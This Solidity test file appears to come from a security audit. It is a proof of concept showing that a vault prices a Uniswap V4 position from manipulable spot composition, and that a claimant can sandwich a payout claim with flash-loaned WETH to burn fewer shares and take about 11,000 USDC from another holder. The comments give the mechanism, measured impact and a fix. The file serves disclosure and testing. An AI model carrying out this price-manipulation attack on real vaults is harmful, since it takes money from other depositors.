// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {Sandwicher} from "./UnwindSpotSandwich.t.sol";
import {HubFundFixture} from "./HubFundFixture.sol";

/// @title Proof of concept: the hub position's composition at a manipulated spot, priced with the external price, inflates the Share Price
/// @notice Share Assets value a hub Uniswap V4 position as `principal0 * price(WETH) + principal1`, where the token
///         split comes from the pool's `slot0` now (`UniswapV4Adapter.positionValue`, `CoreVaultLogic._positionsPrincipal`)
///         and the WETH price from the price source (Chainlink). A concentrated position's holdings, valued at a fixed
///         external price, are a convex function of the pool price with the minimum at that external price: any move of
///         the pool away from it makes the same liquidity look worth more. A claimant who pushes the pool to the edge of
///         the fund's range inside the claim transaction is therefore paid at an inflated Share Price and burns fewer
///         shares for the same USDC, without any unwind (the claim is paid from Idle). The pool is restored afterwards.
/// @dev Attack: two holders of 1,000,000 USDC each; the manager puts half the fund into a ±10% WETH/USDC position; the
///      attacker requests a 900,000 USDC Standard Payout fully covered by the Payout Reserve; at the claim it sells
///      flash-loaned WETH until the fund's position is entirely WETH (10% below the external price), claims, buys back.
///      Measured against the same claim made honestly.
/// @dev Impact (measured): Share Assets are priced 27,154 USDC (1.4%) above their value at the external price, the
///      attacker burns 12,261 fewer shares for the same 897,749 USDC and ends 8,647 USDC richer than after an honest
///      claim, net of two 0.05% LP fees; the other holder is 11,031 USDC poorer. The premium is the position's
///      convexity (2.8% of a ±10% position at its edge; more for wider ranges), times the position's weight in Share
///      Assets, times the claim; the cost is only the LP fee on the volume the pool's depth requires. Deposits cannot be
///      gamed the same way (the premium only ever raises the Share Price), payouts can, and so can the Standard reserve.
/// @dev Fix: value a Uniswap V4 position from its liquidity at the external price (compute `principal0/principal1`
///      at the price source's price, not at `slot0`, i.e. the composition the position would have if the pool were
///      arbitraged), or refuse a payout while `slot0` deviates from the external price beyond a tolerance.
contract CompositionSharePriceTest is HubFundFixture {
    address internal victim = makeAddr("victim");
    Sandwicher internal attacker;
    int24 internal lower;
    int24 internal upper;

    function setUp() public override {
        super.setUp();
        (int24 lo, int24 hi) = _rangeAround(5000);
        _provideExternalLiquidity(lo, hi, 2000e18, 5_000_000e6);

        attacker = new Sandwicher(core, router, IERC20(address(weth)), IERC20(address(usdc)), key);
        _deposit(victim, 1_000_000e6);
        usdc.mint(address(attacker), 1_000_000e6);
        attacker.deposit(1_000_000e6);

        (lower, upper) = _rangeAround(1000);
        _allocateAndOpen(core.freeIdle() / 2, lower, upper);
        _arbToExternalPrice();

        // Fully reserved from Free Idle: the claim never unwinds anything.
        attacker.request(900_000e6, ICoreVault.PayoutMode.Standard);
        assertEq(core.payoutRequest(address(attacker)).reserved, 900_000e6, "reserve covers the whole request");
        vm.warp(block.timestamp + 72 hours);
    }

    function test_POC_spotCompositionInflatesSharePriceForAClaim() public {
        uint256 assetsAtExternalPrice = core.shareAssets();

        // Honest claim, for reference.
        uint256 snapshot = vm.snapshotState();
        ICoreVault.PayoutReceipt memory honest = attacker.claim();
        _arbToExternalPrice();
        uint256 victimHonest = _wealth(victim);
        uint256 attackerHonest = _wealth(address(attacker));
        assertEq(honest.unwindProceeds, 0, "paid from Idle");
        vm.revertToState(snapshot);

        // Push the pool 10% down so the fund's position becomes WETH only, still priced at 2,500 by the price source.
        uint256 dump = 1000e18;
        weth.mint(address(attacker), dump);
        vm.recordLogs();
        ICoreVault.PayoutReceipt memory gamed = attacker.sandwichClaim(dump, startSqrtPrice);
        assertApproxEqRel(_usdcPerWeth(_spotSqrtPrice()), WETH_PRICE * 1e6, 0.001e18, "price restored");
        assertEq(gamed.unwindProceeds, 0, "paid from Idle");

        uint256 victimAfter = _wealth(victim);
        uint256 attackerAfter = _wealth(address(attacker)) - _fair(dump);

        emit log_named_decimal_uint("Share Assets at the external price", assetsAtExternalPrice, 6);
        emit log_named_decimal_uint("Share Assets the gamed claim was priced at", gamed.shareAssets, 6);
        emit log_named_decimal_uint("shares burned, honest", honest.sharesBurned, 18);
        emit log_named_decimal_uint("shares burned, gamed", gamed.sharesBurned, 18);
        emit log_named_decimal_uint("victim loss vs honest claim (USDC)", victimHonest - victimAfter, 6);
        emit log_named_decimal_uint("attacker gain vs honest claim (USDC)", attackerAfter - attackerHonest, 6);

        // The claim was priced above the fund's value at the external price and burned fewer shares for the same USDC.
        assertGt(gamed.shareAssets, assetsAtExternalPrice + 20_000e6, "Share Assets inflated by more than 20,000 USDC");
        assertApproxEqAbs(gamed.usdcPaid, honest.usdcPaid, 1e6, "same USDC paid");
        assertLt(gamed.sharesBurned, honest.sharesBurned, "fewer shares burned");
        assertGt(victimHonest - victimAfter, 8_000e6, "victim lost more than 8,000 USDC");
        assertGt(attackerAfter, attackerHonest + 5_000e6, "attacker gained more than 5,000 USDC net of LP fees");
    }
}
